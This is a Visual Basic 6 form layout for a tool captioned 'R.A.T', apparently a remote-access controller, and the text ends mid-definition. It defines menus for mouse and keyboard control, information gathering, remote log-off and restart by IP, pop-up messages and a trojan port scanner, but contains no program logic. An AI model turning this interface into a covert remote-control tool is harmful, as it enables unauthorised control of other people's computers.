VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Frm_Main 
   AutoRedraw      =   -1  'True
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   0  'None
   Caption         =   " R.A.T"
   ClientHeight    =   6510
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   10830
   ForeColor       =   &H00000000&
   Icon            =   "frm_main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MousePointer    =   99  'Custom
   ScaleHeight     =   6510
   ScaleWidth      =   10830
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox picTray 
      BorderStyle     =   0  'None
      Height          =   1080
      Left            =   1920
      Picture         =   "frm_main.frx":164A
      ScaleHeight     =   72
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   63
      TabIndex        =   125
      Top             =   5040
      Width           =   945
   End
   Begin VB.PictureBox BackGround 
      Appearance      =   0  'Flat
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      ForeColor       =   &H80000008&
      Height          =   5100
      Left            =   60
      ScaleHeight     =   5023.486
      ScaleMode       =   0  'User
      ScaleWidth      =   1800
      TabIndex        =   67
      Top             =   1130
      Width           =   1830
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   4
         X1              =   2000
         X2              =   0
         Y1              =   2853.578
         Y2              =   2868.44
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   3
         X1              =   2000
         X2              =   0
         Y1              =   3599.669
         Y2              =   3614.532
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   2
         X1              =   2000
         X2              =   0
         Y1              =   4755.963
         Y2              =   4755.963
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   1
         X1              =   2000
         X2              =   0
         Y1              =   4042.568
         Y2              =   4042.568
      End
      Begin VB.Line Line3 
         BorderColor     =   &H00FFFFFF&
         BorderWidth     =   2
         Index           =   0
         X1              =   2000
         X2              =   0
         Y1              =   594.495
         Y2              =   594.495
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Chat"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   8
         Left            =   45
         MouseIcon       =   "frm_main.frx":2C94
         MousePointer    =   99  'Custom
         TabIndex        =   82
         Top             =   3000
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Exit"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   15
         Left            =   45
         MouseIcon       =   "frm_main.frx":2F9E
         MousePointer    =   99  'Custom
         TabIndex        =   81
         Top             =   4844
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "About RAT"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   14
         Left            =   45
         MouseIcon       =   "frm_main.frx":32A8
         MousePointer    =   99  'Custom
         TabIndex        =   80
         Top             =   4501
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Help"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   13
         Left            =   45
         MouseIcon       =   "frm_main.frx":35B2
         MousePointer    =   99  'Custom
         TabIndex        =   79
         Top             =   4200
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "TROJAN Scanner"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   12
         Left            =   45
         MouseIcon       =   "frm_main.frx":38BC
         MousePointer    =   99  'Custom
         TabIndex        =   77
         Top             =   3785
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Message"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   9
         Left            =   45
         MouseIcon       =   "frm_main.frx":3BC6
         MousePointer    =   99  'Custom
         TabIndex        =   76
         Top             =   3360
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Terminate"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   7
         Left            =   45
         MouseIcon       =   "frm_main.frx":3ED0
         MousePointer    =   99  'Custom
         TabIndex        =   75
         Top             =   2520
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Keyboard Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   6
         Left            =   45
         MouseIcon       =   "frm_main.frx":41DA
         MousePointer    =   99  'Custom
         TabIndex        =   74
         Top             =   2160
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Mouse Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   5
         Left            =   45
         MouseIcon       =   "frm_main.frx":44E4
         MousePointer    =   99  'Custom
         TabIndex        =   73
         Top             =   1800
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Get Information"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   195
         Index           =   4
         Left            =   45
         MouseIcon       =   "frm_main.frx":47EE
         MousePointer    =   99  'Custom
         TabIndex        =   72
         Top             =   1440
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Control"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   3
         Left            =   45
         MouseIcon       =   "frm_main.frx":4AF8
         MousePointer    =   99  'Custom
         TabIndex        =   71
         Top             =   1080
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Open / Close"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   2
         Left            =   45
         MouseIcon       =   "frm_main.frx":4E02
         MousePointer    =   99  'Custom
         TabIndex        =   70
         Top             =   720
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Scanner"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   1
         Left            =   50
         MouseIcon       =   "frm_main.frx":510C
         MousePointer    =   99  'Custom
         TabIndex        =   69
         Top             =   343
         Width           =   1755
      End
      Begin VB.Label door 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         BackStyle       =   0  'Transparent
         Caption         =   "Connect"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   210
         Index           =   0
         Left            =   45
         MouseIcon       =   "frm_main.frx":5416
         MousePointer    =   99  'Custom
         TabIndex        =   68
         Top             =   45
         Width           =   1755
      End
   End
   Begin VB.PictureBox Picture2 
      BackColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   135
      Top             =   360
      Width           =   8895
      Begin MSComctlLib.ProgressBar ProgressBar 
         Height          =   3855
         Left            =   6600
         TabIndex        =   144
         ToolTipText     =   "Scanning  Progress"
         Top             =   960
         Width           =   255
         _ExtentX        =   450
         _ExtentY        =   6800
         _Version        =   393216
         BorderStyle     =   1
         Appearance      =   0
         Max             =   417
         Orientation     =   1
         Scrolling       =   1
      End
      Begin VB.TextBox txttip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   3
         Left            =   4800
         MaxLength       =   3
         TabIndex        =   140
         Text            =   "1"
         ToolTipText     =   "IP to Scan"
         Top             =   4560
         Width           =   375
      End
      Begin VB.TextBox txttip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   2
         Left            =   4440
         MaxLength       =   3
         TabIndex        =   139
         Text            =   "0"
         ToolTipText     =   "IP to Scan"
         Top             =   4560
         Width           =   375
      End
      Begin VB.TextBox txttip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   1
         Left            =   4080
         MaxLength       =   3
         TabIndex        =   138
         Text            =   "0"
         ToolTipText     =   "IP to Scan"
         Top             =   4560
         Width           =   375
      End
      Begin VB.TextBox txttip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   0
         Left            =   3720
         MaxLength       =   3
         TabIndex        =   137
         Text            =   "127"
         ToolTipText     =   "IP to Scan"
         Top             =   4560
         Width           =   375
      End
      Begin VB.Timer tmrtrojan 
         Interval        =   50
         Left            =   0
         Top             =   5400
      End
      Begin MSWinsockLib.Winsock socktrojan 
         Left            =   480
         Top             =   5400
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.Data Data1 
         Caption         =   "Data1"
         Connect         =   "Access"
         DatabaseName    =   ""
         DefaultCursorType=   0  'DefaultCursor
         DefaultType     =   2  'UseODBC
         Exclusive       =   0   'False
         Height          =   345
         Left            =   960
         Options         =   0
         ReadOnly        =   0   'False
         RecordsetType   =   1  'Dynaset
         RecordSource    =   "Trojan"
         Top             =   5400
         Visible         =   0   'False
         Width           =   2340
      End
      Begin MSComctlLib.ListView lsttrojan 
         Height          =   3375
         Left            =   2520
         TabIndex        =   141
         ToolTipText     =   "Trojan Horse Programs - Waiting For a Connection"
         Top             =   960
         Width           =   3855
         _ExtentX        =   6800
         _ExtentY        =   5953
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         FullRowSelect   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         ForeColor       =   0
         BackColor       =   -2147483632
         BorderStyle     =   1
         Appearance      =   0
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   3
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "TROJAN"
            Object.Width           =   2822
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Alignment       =   2
            SubItemIndex    =   1
            Text            =   "PORT"
            Object.Width           =   1764
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Alignment       =   2
            SubItemIndex    =   2
            Text            =   "PROTOCOL"
            Object.Width           =   2205
         EndProperty
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   9
         X1              =   6960
         X2              =   6480
         Y1              =   840
         Y2              =   840
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   8
         X1              =   6960
         X2              =   6360
         Y1              =   4920
         Y2              =   4920
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   7
         X1              =   6960
         X2              =   6960
         Y1              =   840
         Y2              =   4920
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   6
         X1              =   6480
         X2              =   6480
         Y1              =   1320
         Y2              =   4920
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   5
         X1              =   2400
         X2              =   2400
         Y1              =   1320
         Y2              =   4920
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   4
         X1              =   2400
         X2              =   6480
         Y1              =   4920
         Y2              =   4920
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   3
         X1              =   6480
         X2              =   2400
         Y1              =   4440
         Y2              =   4440
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   2
         X1              =   6480
         X2              =   2400
         Y1              =   840
         Y2              =   840
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   1
         X1              =   6480
         X2              =   6480
         Y1              =   840
         Y2              =   4440
      End
      Begin VB.Line Line18 
         BorderColor     =   &H00FFFFFF&
         Index           =   0
         X1              =   2400
         X2              =   2400
         Y1              =   840
         Y2              =   4440
      End
      Begin VB.Label lblstop 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "STOP"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   270
         Left            =   5400
         MouseIcon       =   "frm_main.frx":5720
         MousePointer    =   99  'Custom
         TabIndex        =   143
         ToolTipText     =   "Stop Scanning "
         Top             =   4560
         Width           =   975
      End
      Begin VB.Label lblscan 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "SCAN"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   270
         Left            =   2520
         MouseIcon       =   "frm_main.frx":5A2A
         MousePointer    =   99  'Custom
         TabIndex        =   142
         ToolTipText     =   "Scan For Trojans"
         Top             =   4560
         Width           =   975
      End
      Begin VB.Label Label10 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Trojan Scanner"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   136
         Top             =   0
         Width           =   8745
      End
   End
   Begin VB.PictureBox Picture1 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Index           =   1
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   130
      Top             =   360
      Width           =   8895
      Begin VB.ComboBox cmbmtype 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   315
         ItemData        =   "frm_main.frx":5D34
         Left            =   3600
         List            =   "frm_main.frx":5D47
         Style           =   2  'Dropdown List
         TabIndex        =   64
         ToolTipText     =   "Message Type"
         Top             =   3600
         Width           =   2535
      End
      Begin VB.TextBox txttitle 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   3600
         MaxLength       =   20
         TabIndex        =   62
         Text            =   "RAT - ALERT"
         ToolTipText     =   "Ttitle Of The Mesage"
         Top             =   840
         Width           =   2535
      End
      Begin VB.TextBox txtmsgdata 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2085
         Left            =   3600
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   63
         Text            =   "frm_main.frx":5D82
         ToolTipText     =   "Message"
         Top             =   1320
         Width           =   2535
      End
      Begin VB.Label lblctrl 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Send"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   4440
         MouseIcon       =   "frm_main.frx":5D93
         MousePointer    =   99  'Custom
         TabIndex        =   66
         ToolTipText     =   "Send Message"
         Top             =   4560
         Width           =   1575
      End
      Begin VB.Label Label13 
         BackColor       =   &H00404040&
         Caption         =   "TYPE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   2
         Left            =   2520
         TabIndex        =   134
         Top             =   3650
         Width           =   975
      End
      Begin VB.Label Label1 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Message Center"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Index           =   1
         Left            =   0
         TabIndex        =   133
         Top             =   0
         Width           =   8745
      End
      Begin VB.Line Line2 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2400
         X2              =   2400
         Y1              =   600
         Y2              =   4200
      End
      Begin VB.Line Line4 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2400
         X2              =   6240
         Y1              =   600
         Y2              =   600
      End
      Begin VB.Line Line5 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   6240
         X2              =   6240
         Y1              =   600
         Y2              =   4200
      End
      Begin VB.Line Line6 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2400
         X2              =   6240
         Y1              =   4200
         Y2              =   4200
      End
      Begin VB.Label Label13 
         BackColor       =   &H00404040&
         Caption         =   "TITLE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   2520
         TabIndex        =   132
         Top             =   880
         Width           =   975
      End
      Begin VB.Label Label14 
         BackColor       =   &H00404040&
         Caption         =   "MESSAGE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   2520
         TabIndex        =   131
         Top             =   2160
         Width           =   1335
      End
      Begin VB.Line Line7 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2400
         X2              =   6240
         Y1              =   4440
         Y2              =   4440
      End
      Begin VB.Line Line9 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2400
         X2              =   2400
         Y1              =   4440
         Y2              =   4920
      End
      Begin VB.Line Line10 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   6240
         X2              =   6240
         Y1              =   4440
         Y2              =   4920
      End
      Begin VB.Line Line8 
         BorderColor     =   &H80000005&
         Index           =   1
         X1              =   2400
         X2              =   6240
         Y1              =   4920
         Y2              =   4920
      End
      Begin VB.Label lblctrl 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "Generate"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   2640
         MouseIcon       =   "frm_main.frx":609D
         MousePointer    =   99  'Custom
         TabIndex        =   65
         ToolTipText     =   "Preview Message"
         Top             =   4560
         Width           =   1575
      End
   End
   Begin VB.PictureBox Picture8 
      BackColor       =   &H00404040&
      FillColor       =   &H00404040&
      Height          =   5895
      Left            =   1920
      ScaleHeight     =   5835
      ScaleWidth      =   8835
      TabIndex        =   98
      Top             =   360
      Width           =   8895
      Begin VB.OptionButton Option 
         BackColor       =   &H00404040&
         Caption         =   "Other"
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   3720
         TabIndex        =   51
         ToolTipText     =   "Work With Other Computer In Network"
         Top             =   1920
         Width           =   855
      End
      Begin VB.OptionButton Option 
         BackColor       =   &H00404040&
         Caption         =   "Server"
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   2280
         TabIndex        =   50
         ToolTipText     =   "Work On Server"
         Top             =   1920
         Width           =   975
      End
      Begin VB.TextBox txtip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   3
         Left            =   4080
         MaxLength       =   3
         TabIndex        =   55
         Text            =   "1"
         ToolTipText     =   "IP Of The Other Computer"
         Top             =   2400
         Width           =   375
      End
      Begin VB.TextBox txtip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   2
         Left            =   3720
         MaxLength       =   3
         TabIndex        =   54
         Text            =   "0"
         ToolTipText     =   "IP Of The Other Computer"
         Top             =   2400
         Width           =   375
      End
      Begin VB.TextBox txtip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   1
         Left            =   3360
         MaxLength       =   3
         TabIndex        =   53
         Text            =   "0"
         ToolTipText     =   "IP Of The Other Computer"
         Top             =   2400
         Width           =   375
      End
      Begin VB.TextBox txtip 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Index           =   0
         Left            =   3000
         MaxLength       =   3
         TabIndex        =   52
         Text            =   "127"
         ToolTipText     =   "IP Of The Other Computer"
         Top             =   2400
         Width           =   375
      End
      Begin VB.TextBox txtmsg 
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1455
         Left            =   2280
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   57
         Text            =   "frm_main.frx":63A7
         ToolTipText     =   "Message To Display During Shutdown"
         Top             =   3360
         Width           =   2175
      End
      Begin VB.TextBox txtxtime 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   285
         Left            =   3325
         MaxLength       =   4
         TabIndex        =   56
         Text            =   "1234"
         ToolTipText     =   "Countdown Time In Seconds"
         Top             =   2880
         Width           =   1125
      End
      Begin VB.Label Label8 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "TERMINATE"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   11.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000014&
         Height          =   255
         Left            =   0
         TabIndex        =   99
         Top             =   0
         Width           =   8745
      End
      Begin VB.Label lblterminate 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "LOG OFF"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   3
         Left            =   4920
         MouseIcon       =   "frm_main.frx":63C2
         MousePointer    =   99  'Custom
         TabIndex        =   61
         ToolTipText     =   "Log Off Current User"
         Top             =   4320
         Width           =   1095
      End
      Begin VB.Label lblterminate 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "RESTART"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   2
         Left            =   4920
         MouseIcon       =   "frm_main.frx":66CC
         MousePointer    =   99  'Custom
         TabIndex        =   60
         ToolTipText     =   "Restart The System"
         Top             =   3600
         Width           =   1095
      End
      Begin VB.Label lblterminate 
         Alignment       =   2  'Center
         BackColor       =   &H00000000&
         Caption         =   "ABORT"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   4920
         MouseIcon       =   "frm_main.frx":69D6
         MousePointer    =   99  'Custom
         TabIndex        =   59
         ToolTipText     =   "Abort Shutdown "
         Top             =   2880
         Width           =   1095
      End
      Begin VB.Label Label7 
         BackColor       =   &H00404040&
         Caption         =   "IP"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   1
         Left            =   2160
         TabIndex        =   129
         Top             =   2400
         Width           =   615
      End
      Begin VB.Label Label7 
         BackColor       =   &H00404040&
         Caption         =   "TIME in sec"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H80000005&
         Height          =   255
         Index           =   0
         Left            =   2160
